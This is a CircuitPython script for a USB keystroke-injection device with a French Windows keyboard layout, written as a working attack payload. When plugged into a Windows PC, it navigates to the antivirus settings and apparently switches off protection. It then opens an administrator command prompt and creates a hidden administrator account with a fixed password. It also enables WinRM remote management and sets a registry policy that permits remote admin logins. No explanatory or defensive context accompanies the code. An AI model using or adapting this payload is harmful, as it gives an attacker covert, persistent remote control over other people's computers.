import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_win_fr import KeyboardLayout
from adafruit_hid.keycode import Keycode
import time
import os

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)
time.sleep(2)

command1 = """NET USER RD_User RD_P@ssW0rD /ADD"""
command2 = """NET LOCALGROUP Administrators RD_User /ADD"""
command3 = """WINRM QUICKCONFIG"""
command4 = """y"""
command5 = """REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1"""
command6 = """REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v RD_User /t REG_DWORD /d 0"""
command7 = """exit"""

kbd.send(Keycode.GUI), time.sleep(.7)
layout.write('virus and threat protection'), time.sleep(.5)
layout.write('\n'), time.sleep(.5)
for i in range(7):
    kbd.send(Keycode.TAB), time.sleep(.5)
layout.write('\n'), time.sleep(.5)
layout.write(' '), time.sleep(.5)
kbd.send(Keycode.LEFT_ARROW), time.sleep(.5)
layout.write('\n'), time.sleep(.5)
# kbd.send(Keycode.GUI, Keycode.R), time.sleep(.5)
# layout.write("powershell"), time.sleep(.5)
# layout.write('\n'), time.sleep(1)

#Lance cmd en tant qu'admin

kbd.send(Keycode.GUI), time.sleep(.7)
layout.write('cmd'), time.sleep(.5)
kbd.send(Keycode.RIGHT_ARROW), time.sleep(.5)
kbd.send(Keycode.DOWN_ARROW), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.8)
kbd.send(Keycode.LEFT_ARROW), time.sleep(.7)
kbd.send(Keycode.ENTER), time.sleep(.5)

layout.write(command1), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(command2), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(.5)
layout.write(command3), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(1.5)
layout.write(command4), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(1.5)
layout.write(command5), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(1.5)
layout.write(command6), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(1.5)
layout.write(command7), time.sleep(.5)
kbd.send(Keycode.ENTER), time.sleep(1.5)



